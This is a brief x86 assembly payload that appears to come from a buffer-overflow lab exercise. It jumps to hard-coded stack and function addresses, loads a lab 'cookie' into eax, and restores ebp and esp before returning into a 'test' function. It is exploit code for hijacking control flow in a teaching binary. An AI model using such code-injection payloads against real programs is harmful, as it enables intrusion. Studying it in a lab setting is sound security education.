sub $0x70, %esp
pushl $0x0804c0c0
pushl $0x55683d3b #call first line
pushl $0x08048de3 #call createFile
ret
movl $0x1eb2051b, %eax #move cookie into eax
movl $0x55683da0, %ebp #move value of stack into ebp
movl $0x55683d28, %esp
pushl $0x08048e2c #push address of test
ret
